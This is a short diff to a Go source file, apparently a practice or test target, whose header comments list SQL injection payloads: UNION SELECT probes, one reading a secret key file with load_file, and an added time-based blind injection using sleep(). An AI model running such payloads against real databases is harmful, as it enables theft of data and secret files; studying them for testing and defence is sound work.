@@ -4,7 +4,7 @@
 // ' UNION SELECT * from users1 where 1=1 or password='
 // ' UNION SELECT @@hostname, @@hostname; #
 // ' UNION SELECT @@hostname, load_file('/var/lib/mysql-files/secret_key'); #
-
+// ' or if(database()="a", sleep(10),sleep(20)) and ''='
 package main
 
 import (
